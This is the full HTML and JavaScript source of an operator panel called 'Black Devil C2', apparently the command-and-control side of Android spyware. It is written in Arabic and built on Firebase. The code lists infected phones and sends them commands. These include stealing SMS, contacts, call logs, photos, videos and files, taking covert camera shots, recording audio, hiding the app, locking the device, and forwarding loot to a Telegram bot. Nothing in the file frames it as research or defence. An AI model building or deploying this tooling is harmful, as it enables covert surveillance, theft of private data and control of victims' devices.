<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Black Devil C2</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body { background: #0a0a0a; color: #e0e0e0; height: 100vh; width: 100vw; overflow: hidden; }
        ::-webkit-scrollbar { width: 4px; } ::-webkit-scrollbar-thumb { background: #ff1744; }

        /* --- Splash --- */
        #splash { position: fixed; top:0; left:0; width:100vw; height:100vh; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999; transition:opacity 0.8s; }
        #splash.hide { opacity:0; pointer-events:none; }
        .skull { font-size:100px; color:#ff1744; text-shadow:0 0 80px #ff174488; animation:pulse 1.5s infinite alternate; }
        @keyframes pulse { 0%{transform:scale(0.9);} 100%{transform:scale(1.1);} }
        .splash-title { color:#ff1744; font-size:28px; font-weight:900; margin-top:10px; }
        .progress-wrap { width:80%; max-width:400px; margin-top:30px; }
        .progress-bar { width:100%; height:8px; background:#1a1a1a; border-radius:20px; overflow:hidden; border:1px solid #333; }
        .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #ff1744, #ff6f00); border-radius:20px; transition:width 0.3s; box-shadow:0 0 20px #ff174488; }
        .progress-text { display:flex; justify-content:space-between; margin-top:8px; font-size:18px; font-weight:bold; color:#ff1744; }

        /* --- Main UI --- */
        #mainUI { display:none; width:100vw; height:100vh; background:#0a0a0a; flex-direction:column; }
        #mainUI.active { display:flex; }
        
        /* Device Selection */
        #deviceSelector { padding:15px 20px; background:#111; border-bottom:2px solid #b71c1c; display:flex; align-items:center; gap:15px; flex-shrink:0; overflow-x:auto; }
        #deviceSelector .label { color:#888; font-weight:700; }
        .device-chip { background:#1a1a1a; border:1px solid #333; padding:8px 18px; border-radius:30px; cursor:pointer; color:#ccc; white-space:nowrap; transition:0.2s; }
        .device-chip.active { border-color:#ff1744; background:#2a0a0a; color:#fff; box-shadow:0 0 20px #ff174433; }
        .device-chip .bat { color:#4caf50; font-size:12px; }

        /* Command Grid */
        #cmdContainer { flex:1; overflow-y:auto; padding:15px; display:flex; flex-direction:column; }
        #cmdGrid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; padding-bottom:20px; }
        .cmd-btn { background:#1a1a1a; border:1px solid #333; border-radius:14px; padding:14px 8px; text-align:center; cursor:pointer; transition:0.2s; color:#ccc; }
        .cmd-btn:active { transform:scale(0.95); background:#2a0a0a; border-color:#ff1744; }
        .cmd-btn .ico { font-size:28px; display:block; }
        .cmd-btn .lbl { font-size:13px; font-weight:600; margin-top:4px; }

        /* Command Page (Full Screen) */
        #cmdPage { position:fixed; top:0; left:0; width:100vw; height:100vh; background:#0a0a0a; z-index:100; display:none; flex-direction:column; }
        #cmdPage.active { display:flex; }
        .pg-header { background:#111; padding:12px 16px; display:flex; align-items:center; border-bottom:2px solid #b71c1c; flex-shrink:0; }
        .pg-header .back { background:none; border:none; color:#ff1744; font-size:28px; cursor:pointer; padding:0 10px; }
        .pg-header .title { flex:1; text-align:center; font-size:20px; font-weight:800; color:#fff; }
        .pg-header .status { font-size:13px; color:#aaa; }
        .pg-body { flex:1; overflow-y:auto; padding:20px; background:#0d0d0d; }
        .pg-body .result { background:#141414; border:1px solid #2a2a2a; border-radius:12px; padding:18px; white-space:pre-wrap; word-wrap:break-word; font-family:monospace; font-size:14px; color:#ddd; min-height:150px; }
        .pg-body .file-link { display:block; background:#1f1f1f; padding:12px; margin:8px 0; border-radius:8px; border-right:4px solid #ff1744; color:#ff5252; text-decoration:none; }
        .pg-footer { background:#111; padding:12px; display:flex; flex-wrap:wrap; justify-content:center; gap:10px; border-top:2px solid #b71c1c; flex-shrink:0; }
        .pg-footer button { background:#1a1a1a; border:1px solid #333; color:#eee; padding:10px 18px; border-radius:50px; font-size:14px; font-weight:700; cursor:pointer; transition:0.2s; flex:1 0 auto; min-width:80px; }
        .pg-footer button:active { transform:scale(0.95); }
        .btn-exec { background:#b71c1c; border-color:#ff1744; }
        .btn-tele { background:#0d2b3e; border-color:#1e88e5; }
        .btn-copy { background:#1a237e; border-color:#3949ab; }
        .btn-down { background:#1b5e20; border-color:#43a047; }
        .btn-open { background:#4a148c; border-color:#8e24aa; }
        .pg-footer button:disabled { opacity:0.4; pointer-events:none; }
        .loading { text-align:center; padding:40px; color:#ff1744; }
    </style>
</head>
<body>

<!-- ========== SPLASH ========== -->
<div id="splash">
    <div class="skull">💀</div>
    <div class="splash-title">BLACK DEVIL C2</div>
    <div class="progress-wrap">
        <div class="progress-bar"><div class="progress-fill" id="pFill"></div></div>
        <div class="progress-text"><span>جاري التحميل</span><span id="pText">0%</span></div>
    </div>
</div>

<!-- ========== MAIN UI ========== -->
<div id="mainUI">
    <div id="deviceSelector">
        <span class="label">📱 الجهاز:</span>
        <div id="deviceChips"><span style="color:#888;">جاري التحميل...</span></div>
    </div>
    <div id="cmdContainer">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
            <span style="color:#ff1744; font-weight:900;">⚡ الأوامر</span>
            <span id="selectedDeviceLabel" style="color:#888; font-size:13px;">لم يتم اختيار جهاز</span>
        </div>
        <div id="cmdGrid"></div>
    </div>
</div>

<!-- ========== COMMAND PAGE ========== -->
<div id="cmdPage">
    <div class="pg-header">
        <button class="back" id="backCmd">‹</button>
        <span class="title" id="pgTitle">أمر</span>
        <span class="status" id="pgStatus">🟢 جاهز</span>
    </div>
    <div class="pg-body" id="pgBody"><div class="loading">⏳ انتظر...</div></div>
    <div class="pg-footer" id="pgFooter"></div>
</div>

<script>
    // =================================================================
    // 1. FIREBASE CONFIG (عدل هنا)
    // =================================================================
    const firebaseConfig = {
        apiKey: "AIzaSyDummyKeyReplaceMe",
        authDomain: "your-project.firebaseapp.com",
        databaseURL: "https://your-project-default-rtdb.firebaseio.com",
        projectId: "your-project",
        storageBucket: "your-project.appspot.com",
        messagingSenderId: "123456789",
        appId: "1:123456789:web:abcdef"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // =================================================================
    // 2. COMMANDS DATABASE (100+ أمر)
    // =================================================================
    const COMMANDS = [
        // A - نصوص
        { id:'get_device', label:'معلومات الجهاز', icon:'📱', type:'A' },
        { id:'get_network', label:'الشبكة', icon:'📶', type:'A' },
        { id:'get_ip', label:'IP العام', icon:'🌐', type:'A' },
        { id:'get_imei', label:'IMEI', icon:'🆔', type:'A' },
        { id:'get_phone', label:'رقم الهاتف', icon:'📞', type:'A' },
        { id:'get_sim', label:'معلومات SIM', icon:'💳', type:'A' },
        { id:'get_wifi', label:'الواي فاي', icon:'📡', type:'A' },
        { id:'get_battery', label:'البطارية', icon:'🔋', type:'A' },
        { id:'get_accounts', label:'الحسابات', icon:'👤', type:'A' },
        { id:'storage_info', label:'التخزين', icon:'💾', type:'A' },
        { id:'memory_info', label:'الذاكرة (RAM)', icon:'🧠', type:'A' },
        { id:'cpu_info', label:'المعالج', icon:'⚡', type:'A' },
        { id:'sensor_info', label:'الحساسات', icon:'📳', type:'A' },
        { id:'display_info', label:'الشاشة', icon:'🖥️', type:'A' },
        { id:'clipboard_get', label:'الحافظة (قراءة)', icon:'📋', type:'A' },
        { id:'installed_apps', label:'التطبيقات المثبتة', icon:'📦', type:'A' },
        { id:'running_processes', label:'العمليات الجارية', icon:'⚙️', type:'A' },
        // B - جهات اتصال / رسائل
        { id:'get_contacts', label:'جهات الاتصال', icon:'👥', type:'B' },
        { id:'export_contacts', label:'تصدير VCF', icon:'📇', type:'B' },
        { id:'get_sms', label:'الرسائل النصية', icon:'✉️', type:'B' },
        { id:'forward_sms', label:'إعادة توجيه الرسائل', icon:'↪️', type:'B' },
        { id:'get_calllogs', label:'سجل المكالمات', icon:'📞', type:'B' },
        // C - وسائط
        { id:'get_photos', label:'جميع الصور (ZIP)', icon:'🖼️', type:'C' },
        { id:'get_photos_5', label:'أحدث 5 صور', icon:'📸', type:'C' },
        { id:'get_photos_10', label:'أحدث 10 صور', icon:'📸', type:'C' },
        { id:'get_videos', label:'جميع الفيديوهات', icon:'🎥', type:'C' },
        { id:'get_videos_5', label:'أحدث 5 فيديوهات', icon:'🎬', type:'C' },
        { id:'get_files', label:'جميع الملفات (ZIP)', icon:'🗂️', type:'C' },
        { id:'get_audio', label:'الملفات الصوتية', icon:'🎵', type:'C' },
        { id:'get_documents', label:'المستندات', icon:'📄', type:'C' },
        { id:'take_photo', label:'تصوير (خلفي)', icon:'📷', type:'C' },
        { id:'take_photo_front', label:'تصوير (سيلفي)', icon:'🤳', type:'C' },
        { id:'screenshot', label:'لقطة شاشة', icon:'📱', type:'C' },
        { id:'start_record', label:'بدء تسجيل صوت', icon:'🎙️', type:'C' },
        { id:'stop_record', label:'إيقاف التسجيل', icon:'⏹️', type:'C' },
        // D - تحكم
        { id:'lock_device', label:'قفل الجهاز', icon:'🔒', type:'D' },
        { id:'set_lock_password', label:'تعيين كلمة مرور', icon:'🔑', type:'D' },
        { id:'disable_camera', label:'تعطيل الكاميرا', icon:'🚫📷', type:'D' },
        { id:'enable_camera', label:'تفعيل الكاميرا', icon:'✅📷', type:'D' },
        { id:'hide_app', label:'إخفاء التطبيق', icon:'👻', type:'D' },
        { id:'show_app', label:'إظهار التطبيق', icon:'👀', type:'D' },
        { id:'reboot', label:'إعادة تشغيل', icon:'🔄', type:'D' },
        { id:'shutdown', label:'إيقاف تشغيل', icon:'⏻', type:'D' },
        { id:'vibrate', label:'اهتزاز', icon:'📳', type:'D' },
        { id:'open_browser', label:'فتح المتصفح', icon:'🌍', type:'D' },
        { id:'open_url', label:'فتح رابط', icon:'🔗', type:'D' },
        { id:'clear_data', label:'مسح بيانات التطبيق', icon:'🧹', type:'D' },
        { id:'kill_apps', label:'إيقاف جميع التطبيقات', icon:'⏹️', type:'D' },
        { id:'freeze_app', label:'تجميد تطبيق', icon:'❄️', type:'D' },
        { id:'set_brightness', label:'ضبط السطوع', icon:'☀️', type:'D' },
        { id:'toggle_wifi_on', label:'تشغيل الواي فاي', icon:'📶', type:'D' },
        { id:'toggle_wifi_off', label:'إيقاف الواي فاي', icon:'📶❌', type:'D' },
        { id:'toggle_bluetooth_on', label:'تشغيل البلوتوث', icon:'📡', type:'D' },
        { id:'toggle_bluetooth_off', label:'إيقاف البلوتوث', icon:'📡❌', type:'D' },
        { id:'toggle_data_on', label:'تشغيل البيانات', icon:'📶4G', type:'D' },
        { id:'toggle_data_off', label:'إيقاف البيانات', icon:'📶4G❌', type:'D' },
        { id:'toggle_location_on', label:'تشغيل الموقع', icon:'📍', type:'D' },
        { id:'toggle_location_off', label:'إيقاف الموقع', icon:'📍❌', type:'D' },
        { id:'open_app_whatsapp', label:'فتح واتساب', icon:'💬', type:'D' },
        { id:'open_app_facebook', label:'فتح فيسبوك', icon:'📘', type:'D' },
        { id:'open_app_instagram', label:'فتح انستغرام', icon:'📸', type:'D' },
        { id:'open_app_youtube', label:'فتح يوتيوب', icon:'▶️', type:'D' },
        { id:'open_app_telegram', label:'فتح تيليجرام', icon:'📨', type:'D' },
        { id:'flash_on', label:'فلاش (تشغيل)', icon:'🔦', type:'D' },
        { id:'flash_off', label:'فلاش (إيقاف)', icon:'🔦❌', type:'D' },
        { id:'clipboard_set', label:'كتابة في الحافظة', icon:'✏️', type:'A' },
        { id:'get_logs', label:'سجلات التطبيق', icon:'📜', type:'A' },
    ];

    // =================================================================
    // 3. VARIABLES
    // =================================================================
    let currentDeviceId = null;
    let currentCmdId = null;
    let devicesMap = {};

    // =================================================================
    // 4. SPLASH SCREEN
    // =================================================================
    let p = 0;
    const pFill = document.getElementById('pFill');
    const pText = document.getElementById('pText');
    function updateSplash() {
        p += Math.random() * 4 + 2;
        if (p > 100) p = 100;
        pFill.style.width = p + '%';
        pText.innerText = Math.floor(p) + '%';
        if (p < 100) { setTimeout(updateSplash, 120 + Math.random()*150); }
        else {
            setTimeout(() => {
                document.getElementById('splash').classList.add('hide');
                document.getElementById('mainUI').classList.add('active');
                loadDevices();
            }, 400);
        }
    }
    setTimeout(updateSplash, 500);

    // =================================================================
    // 5. LOAD DEVICES
    // =================================================================
    function loadDevices() {
        const chips = document.getElementById('deviceChips');
        db.ref('devices').once('value').then(snap => {
            chips.innerHTML = '';
            if (!snap.exists()) { chips.innerHTML = '<span style="color:#888;">لا توجد أجهزة</span>'; return; }
            snap.forEach(child => {
                const id = child.key;
                let data = child.val();
                try { data = JSON.parse(data); } catch(e) {}
                devicesMap[id] = data;
                const chip = document.createElement('span');
                chip.className = 'device-chip';
                chip.innerText = `${data.device_name || 'جهاز'} 🔋${data.battery || 0}%`;
                chip.onclick = () => selectDevice(id, chip);
                chips.appendChild(chip);
            });
            // Select first automatically
            const first = chips.querySelector('.device-chip');
            if (first) first.click();
        }).catch(err => { chips.innerHTML = '<span style="color:#ff1744;">خطأ في Firebase</span>'; });
    }

    function selectDevice(id, el) {
        document.querySelectorAll('.device-chip').forEach(c => c.classList.remove('active'));
        if (el) el.classList.add('active');
        currentDeviceId = id;
        document.getElementById('selectedDeviceLabel').innerText = `📱 ${devicesMap[id]?.device_name || id}`;
        renderCommands();
    }

    // =================================================================
    // 6. RENDER COMMANDS
    // =================================================================
    function renderCommands() {
        const grid = document.getElementById('cmdGrid');
        grid.innerHTML = '';
        if (!currentDeviceId) { grid.innerHTML = '<div style="color:#888;">اختر جهازاً أولاً</div>'; return; }
        COMMANDS.forEach(cmd => {
            const btn = document.createElement('div');
            btn.className = 'cmd-btn';
            btn.innerHTML = `<span class="ico">${cmd.icon}</span><span class="lbl">${cmd.label}</span>`;
            btn.onclick = () => openCommandPage(cmd);
            grid.appendChild(btn);
        });
    }

    // =================================================================
    // 7. COMMAND PAGE (Full Screen)
    // =================================================================
    function openCommandPage(cmd) {
        currentCmdId = cmd.id;
        document.getElementById('cmdPage').classList.add('active');
        document.getElementById('pgTitle').innerHTML = `${cmd.icon} ${cmd.label}`;
        document.getElementById('pgStatus').innerText = '⏳ جاري التحميل...';
        document.getElementById('pgBody').innerHTML = '<div class="loading">⏳ جاري تحميل النتيجة...</div>';
        renderFooter(cmd.type);
        fetchResult(cmd.id);
    }

    function renderFooter(type) {
        const footer = document.getElementById('pgFooter');
        footer.innerHTML = '';
        const btns = [];
        btns.push({ id:'exec', label:'⚡ تنفيذ', cls:'btn-exec' });
        btns.push({ id:'tele', label:'🤖 إرسال للبوت', cls:'btn-tele' });
        if (type === 'A' || type === 'B') btns.push({ id:'copy', label:'📋 نسخ النص', cls:'btn-copy' });
        if (type === 'B' || type === 'C') {
            btns.push({ id:'down', label:'⬇️ تحميل', cls:'btn-down' });
            btns.push({ id:'open', label:'📂 فتح', cls:'btn-open' });
        }
        if (type === 'D') btns.push({ id:'copy', label:'📋 نسخ الحالة', cls:'btn-copy' });
        btns.forEach(b => {
            const btn = document.createElement('button');
            btn.className = b.cls;
            btn.innerText = b.label;
            btn.onclick = () => handleAction(b.id);
            footer.appendChild(btn);
        });
    }

    function fetchResult(cmdId) {
        if (!currentDeviceId) return;
        db.ref(`devices/${currentDeviceId}/data/${cmdId}`).once('value').then(snap => {
            const data = snap.val();
            const body = document.getElementById('pgBody');
            if (data) {
                let html = '<div class="result">';
                if (typeof data === 'string' && (data.startsWith('http') || data.includes('firebasestorage'))) {
                    html += `<a href="${data}" target="_blank" class="file-link">📁 ${data}</a>`;
                } else if (typeof data === 'object') {
                    html += JSON.stringify(data, null, 2);
                } else {
                    html += data;
                }
                html += '</div>';
                body.innerHTML = html;
                document.getElementById('pgStatus').innerText = '✅ تم التنفيذ';
            } else {
                body.innerHTML = '<div class="result">⚠️ لا توجد نتيجة. اضغط "تنفيذ" لإرسال الأمر.</div>';
                document.getElementById('pgStatus').innerText = '⏳ انتظار التنفيذ';
            }
        }).catch(e => {
            document.getElementById('pgBody').innerHTML = `<div class="result">❌ خطأ: ${e.message}</div>`;
        });
    }

    // =================================================================
    // 8. ACTIONS (Execute, Telegram, Copy, Download, Open)
    // =================================================================
    function handleAction(action) {
        if (!currentDeviceId || !currentCmdId) return alert('❌ اختر جهازاً وأمراً أولاً');
        if (action === 'exec') {
            db.ref(`commands/${currentDeviceId}`).set({ command: currentCmdId, timestamp: Date.now() })
                .then(() => { document.getElementById('pgStatus').innerText = '📤 تم الإرسال...'; setTimeout(() => fetchResult(currentCmdId), 2500); })
                .catch(e => alert('❌ فشل الإرسال: ' + e.message));
        }
        else if (action === 'tele') {
            db.ref(`commands/${currentDeviceId}`).set({ command: `send_to_telegram_${currentCmdId}`, timestamp: Date.now() })
                .then(() => alert('✅ تم طلب الإرسال للبوت')).catch(e => alert('❌ ' + e.message));
        }
        else if (action === 'copy') {
            const res = document.querySelector('#pgBody .result');
            if (res) {
                navigator.clipboard?.writeText(res.innerText).then(() => alert('✅ تم النسخ'))
                .catch(() => { const ta = document.createElement('textarea'); ta.value = res.innerText; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); alert('✅ تم النسخ'); });
            } else alert('❌ لا يوجد نص');
        }
        else if (action === 'down') {
            const link = document.querySelector('#pgBody .file-link');
            if (link?.href) { window.open(link.href, '_blank'); }
            else {
                const text = document.querySelector('#pgBody .result')?.innerText || '';
                const url = text.match(/(https?:\/\/[^\s]+)/);
                if (url) window.open(url[0], '_blank');
                else alert('❌ لا يوجد رابط تحميل');
            }
        }
        else if (action === 'open') {
            const link = document.querySelector('#pgBody .file-link');
            if (link?.href) window.open(link.href, '_blank');
            else alert('❌ لا يوجد ملف لفتحه');
        }
    }

    // =================================================================
    // 9. BACK TO MENU
    // =================================================================
    document.getElementById('backCmd').onclick = () => {
        document.getElementById('cmdPage').classList.remove('active');
    };
</script>
</body>
</html>
